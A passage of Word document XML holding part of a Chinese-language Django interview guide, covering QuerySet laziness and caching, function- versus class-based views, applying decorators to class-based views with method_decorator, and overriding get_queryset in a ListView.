          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Queryset</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>有哪些特性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF9BAFA" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的QuerySet主要有两个特性：一是惰性的(lazy)，二是自带缓存。我们来看个例子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0086D999" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下例中article_list试图从数据库查询一个标题含有django的全部文章列表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50566EB7" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_list = Article.objects.filter(title__contains="django")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE23BCC" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>但是当我们定义article_list的时候，Django的数据接口QuerySet并没有对数据库进行任何查询。无论你加多少过滤条件，Django都不会对数据库进行查询。只有当你需要对article_list做进一步运算时（比如打印出查询结果，判断是否存在，统计查询结果长度)，Django才会真正执行对数据库的查询(见下例1)。这个过程被称为queryset的执行(evaluation)。Django这样设计的本意是尽量减少对数据库的无效操作，比如查询了结果而不用是计算资源的很大浪费。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681CD3D4" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># example 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F75A3C" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>for article in article_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104D910F" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(article.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC29716" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在例1中，当你遍历queryset(article_list)时，所有匹配的记录会从数据库获取。这些结果会载入内存并保存在queryset内置的cache中。这样如果你再次遍历或读取这个article_list时，Django就不需要重复查询了，这样也可以减少对数据库的查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662AE807" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更多阅读:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171447DC" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="00D96E02" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId199" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(12)：深夜放干货。QuerySet特性及高级使用技巧，如何减少数据库的访问，节省内存，提升网站性能。</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="00158B4F" w14:textId="2BD6B5BF"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005</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>什么是基于函数的视图（</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>FBV)</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和基于类的视图（</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>CBV)</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>以及各自的优点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558DF4A5" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>FBV（function base views） 就是在视图里使用函数处理请求。CBV（class base views） 就是在视图里使用类处理请求。Python是一个面向对象的编程语言，如果只用函数来开发，有很多面向对象的优点就错失了（继承、封装、多态）。所以Django在后来加入了Class-Based-View，可以让我们用类写View，这样做的优点主要下面两种：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41EF3875" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>提高了代码的复用性，可以使用面向对象的技术，比如Mixin（多继承）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1155B1CE" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>可以用不同的函数针对不同的HTTP方法处理，而不是通过很多if判断，提高代码可读性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F92E263" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当然基于函数的视图也有自己的优点，比如对新手更友好。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6103AC6E" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更多阅读:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FAE834" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="00D96E02" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId200" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django核心基础(3): View视图详解。一旦你使用通用视图，你就会爱上她。</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="08AAF07B" w14:textId="6AE9D7DB"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006</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何给基于类的视图（</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>CBV)</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>使用装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D84D24" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>需要借助django.utils模块的method_decorator方法实现，它还支持decorators列表, 如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2514293C"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django.utils.decorators import method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117E9D65" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4168E0D1"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decorators = [login_required, check_user_permission]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F858372" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70109E3A" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="489313FA"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@method_decorator(decorators, name='dispatch')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D722FDE"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class ArticleCreateView(CreateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A32D84"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model = Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1600EF"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form_class = ArticleForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2EC4D1" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t xml:space="preserve">    template_name = 'blog/article_manage_form.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F41404C" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更多阅读:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454C6A31" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="00D96E02" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId201" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(26): 常用装饰器应用场景及正确使用方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1F92B7B0" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="00D96E02" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId202" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>一文看懂Python系列之装饰器(decorator)(工作面试必读)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A9DA544" w14:textId="132DD9BF"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007</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>说说看使用基于类的视图</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>(CBV)</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>get_queryset, get_context_data</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>get_object</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>方法的作用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDA02BC" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>get_queryset()方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A7C8C2" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正如其名，该方法可以返回一个量身定制的对象列表。当我们使用Django自带的ListView展示所有对象列表时，ListView默认会返回Model.objects.all()。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79CD61A9"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Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5728908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django.views.generic import ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3D467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lastRenderedPageBreak/>
        <w:t>from .models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC4F848" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E75ACB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class IndexView(ListView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436F91B1" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A350965" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB63637" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>然而这可能不是我们所需要的。当我们希望只展示作者自己发表的文章列表且按文章发布时间逆序排列时，我们就可以通过更具体的get_queryset方法来返回一个我们想要显示的对象列表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4AC39C"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Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3EF329"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django.views.generic import ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390374A4"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.models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549E7E1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django.utils import timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F57E8E8" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A8F0118"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class IndexView(ListView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B29D660" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
